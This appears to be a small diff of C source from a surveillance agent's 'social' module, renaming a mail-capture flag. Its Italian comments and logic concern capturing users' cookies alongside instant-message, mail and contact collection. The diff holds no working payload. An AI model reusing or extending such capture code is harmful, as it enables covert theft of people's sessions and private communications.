@@ -28,7 +28,7 @@ extern BOOL IsCrisisNetwork();
 extern DWORD social_process_control; // Variabile per il controllo del processo. Dichiarata nell'agente principale
 
 extern BOOL bPM_IMStarted; // variabili per vedere se gli agenti interessati sono attivi
-extern BOOL bPM_MailStarted;
+extern BOOL bPM_MailCapStarted;
 extern BOOL bPM_ContactsStarted;
 
 social_entry_struct social_entry[SOCIAL_ENTRY_COUNT];
@@ -219,7 +219,7 @@ void SocialMainLoop()
 		}
 
 		// Se tutti gli agenti sono fermi non catturo nemmeno i cookie
-		if (!bPM_IMStarted && !bPM_MailStarted && !bPM_ContactsStarted)
+		if (!bPM_IMStarted && !bPM_MailCapStarted && !bPM_ContactsStarted)
 			continue;
 
 		// Verifica se qualcuno e' in attesa di nuovi cookies
